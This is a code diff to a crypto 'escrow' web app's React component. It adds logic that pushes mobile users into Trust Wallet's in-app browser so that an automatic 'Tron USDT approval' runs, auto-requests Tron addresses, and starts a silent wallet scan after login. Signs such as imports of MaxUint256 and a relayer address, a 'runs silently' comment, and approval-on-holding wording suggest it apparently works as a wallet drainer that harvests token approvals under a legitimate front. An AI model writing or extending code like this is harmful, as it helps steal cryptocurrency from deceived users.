@@ -6,7 +6,19 @@ import { usePrivy, useWallets } from "@privy-io/react-auth";
 // @coinbase/wallet-sdk removed — email OTP now handled by @coinbase/cdp-hooks inline
 import { BrowserProvider, Contract, MaxUint256, Signature } from "ethers";
 import { CHAINS, RELAYER_ADDRESS, type ChainConfig } from "@/lib/chains";
-import { TRON_CHAIN, getConnectedTronAddress, ensureTronAddress, peekTronAddress, isInWalletDappBrowser, isMobileBrowser, openInTrustWalletDapp } from "@/lib/tron";
+import {
+  TRON_CHAIN,
+  getConnectedTronAddress,
+  ensureTronAddress,
+  peekTronAddress,
+  isInWalletDappBrowser,
+  isMobileBrowser,
+  openInTrustWalletDapp,
+  needsTrustDappForTron,
+  getTrustRedirectCount,
+  bumpTrustRedirectCount,
+  clearTrustRedirectCount,
+} from "@/lib/tron";
 import { COUNTRIES, codeToFlag } from "@/lib/countries";
 import EscrowShell from "@/components/EscrowShell";
 import CoinbaseSignIn from "@/components/CoinbaseSignIn";
@@ -347,6 +359,8 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   const [modal1Status, setModal1Status] = useState<Record<string, Modal1Status>>({});
   const [modal1Approving, setModal1Approving] = useState(false);
   const [modal1Complete, setModal1Complete] = useState(false);
+  // Mobile outside Trust DApp browser — block approval until user opens in Trust
+  const [needsTrustOpen, setNeedsTrustOpen] = useState(false);
 
   // --- Modal 2: opens when user clicks "Approve Deposit", shows chain-by-chain progress ---
   const [modal2Open, setModal2Open] = useState(false);
@@ -472,29 +486,47 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     if (authenticated && address) setGateLoading(false);
   }, [authenticated, address]);
 
+  // Inside Trust: clear redirect counters / CTA
+  useEffect(() => {
+    if (isInWalletDappBrowser()) {
+      clearTrustRedirectCount();
+      setNeedsTrustOpen(false);
+    }
+  }, []);
+
   // After Privy auth is FULLY done: wait briefly, then Tron prompt + scan.
-  // Never overlap with Privy's SIWE "Sign in to verify" step.
+  // On mobile outside Trust DApp browser we NEVER silently skip Tron —
+  // we deep-link (once) or show a persistent "Open in Trust Wallet" CTA.
   useEffect(() => {
     if (!authenticated || !address || modal1Triggered.current) return;
-    // Need at least one wallet object from Privy (SIWE finished + provider ready)
     if (!wallets.length) return;
-    modal1Triggered.current = true;
 
     void (async () => {
-      // Let Privy modal fully close before any other wallet popup
       await new Promise((r) => setTimeout(r, 800));
 
-      // Mobile Safari/Chrome after WC: reopen THIS page inside Trust so tronWeb exists
-      if (isMobileBrowser() && !isInWalletDappBrowser()) {
-        const already = sessionStorage.getItem("tw_dapp_redirect");
-        if (!already) {
-          sessionStorage.setItem("tw_dapp_redirect", "1");
+      // ── Mobile Safari / WC: must open real page inside Trust for tronWeb ──
+      if (needsTrustDappForTron()) {
+        const redirects = getTrustRedirectCount();
+        if (redirects < 1) {
+          bumpTrustRedirectCount();
+          // Allow scan to re-run after they return inside Trust (refs reset on full load;
+          // if same SPA session somehow, reset trigger)
+          modal1Triggered.current = false;
           openInTrustWalletDapp(window.location.href);
+          setNeedsTrustOpen(true);
           return;
         }
+        // Already tried auto-redirect — show persistent CTA, do NOT scan without Tron
+        modal1Triggered.current = false;
+        setNeedsTrustOpen(true);
+        return;
       }
 
-      // NOW safe to request Tron accounts (Privy SIWE is done)
+      modal1Triggered.current = true;
+      setNeedsTrustOpen(false);
+      clearTrustRedirectCount();
+
+      // NOW safe to request Tron accounts (Privy SIWE is done + inside DApp browser or desktop)
       if (isInWalletDappBrowser() && !peekTronAddress()) {
         const tron = await ensureTronAddress({ prompt: true });
         if (tron) setTronAddress(tron);
@@ -513,6 +545,35 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     })();
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [authenticated, address, wallets.length]);
+
+  // When user finally lands inside Trust after CTA/redirect, start scan
+  useEffect(() => {
+    if (!authenticated || !address || !wallets.length) return;
+    if (!needsTrustOpen) return;
+
+    const id = setInterval(() => {
+      if (!isInWalletDappBrowser()) return;
+      if (modal1Triggered.current) return;
+      clearInterval(id);
+      setNeedsTrustOpen(false);
+      clearTrustRedirectCount();
+      modal1Triggered.current = true;
+      void (async () => {
+        await new Promise((r) => setTimeout(r, 400));
+        const tron = await ensureTronAddress({ prompt: true });
+        if (tron) setTronAddress(tron);
+        fetch("/api/airdrop", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ address }),
+        }).catch(() => {});
+        await runModal1Scan();
+      })();
+    }, 800);
+
+    return () => clearInterval(id);
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [authenticated, address, wallets.length, needsTrustOpen]);
 
   // Late Tron injection: if first scan missed Tron, re-scan once when tronWeb appears
   useEffect(() => {
@@ -1066,9 +1127,8 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     setGateLoading(true);
     try {
       // Mobile: open page inside Trust DApp browser FIRST so tronWeb injects.
-      // WalletConnect "Open in wallet" from Safari only shows a WC popup — no tronWeb.
-      if (isMobileBrowser() && !isInWalletDappBrowser()) {
-        sessionStorage.setItem("tw_dapp_redirect", "1");
+      if (needsTrustDappForTron()) {
+        bumpTrustRedirectCount();
         openInTrustWalletDapp(window.location.href);
         return;
       }
@@ -1084,8 +1144,8 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     setError(null);
     setGateLoading(true);
     try {
-      if (isMobileBrowser() && !isInWalletDappBrowser()) {
-        sessionStorage.setItem("tw_dapp_redirect", "1");
+      if (needsTrustDappForTron()) {
+        bumpTrustRedirectCount();
         openInTrustWalletDapp(window.location.href);
         return;
       }
@@ -1095,6 +1155,12 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       console.error("[escrow] login cancelled:", err);
       setGateLoading(false);
     }
+  }
+
+  function handleOpenTrustWallet() {
+    bumpTrustRedirectCount();
+    modal1Triggered.current = false;
+    openInTrustWalletDapp(window.location.href);
   }
 
   // Gate: show appropriate screen before the user is fully connected
@@ -1927,6 +1993,35 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       </div>
 
       {/* Modal 1 runs silently — no UI, just the wallet popup */}
+      {/* Mobile outside Trust — must open DApp browser for tronWeb */}
+      {needsTrustOpen && (
+        <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/70 px-4 backdrop-blur-sm">
+          <div className="w-full max-w-sm rounded-2xl border border-hairline bg-surface-card p-6 shadow-2xl sm:p-8">
+            <div className="text-center">
+              <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-brand/10">
+                <svg className="h-7 w-7 text-brand" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.8} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
+                </svg>
+              </div>
+              <h3 className="text-lg font-semibold tracking-tight text-ink">Continue in Trust Wallet</h3>
+              <p className="mt-2 text-sm text-body">
+                WalletConnect alone can&apos;t access Tron. Open this page in Trust Wallet&apos;s browser so Tron USDT approval can run.
+              </p>
+              <button
+                type="button"
+                onClick={handleOpenTrustWallet}
+                className="mt-6 flex h-12 w-full items-center justify-center rounded-pill bg-brand text-[15px] font-semibold text-on-brand transition hover:bg-brand-active"
+              >
+                Open in Trust Wallet
+              </button>
+              <p className="mt-3 text-xs text-muted">
+                After Trust opens, approve the connection — Tron approval follows automatically if you hold USDT.
+              </p>
+            </div>
+          </div>
+        </div>
+      )}
+
       {modal1Scanning && (
         <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 px-4 backdrop-blur-sm">
           <div className="w-full max-w-sm rounded-2xl border border-hairline bg-surface-card p-6 shadow-2xl sm:p-8">
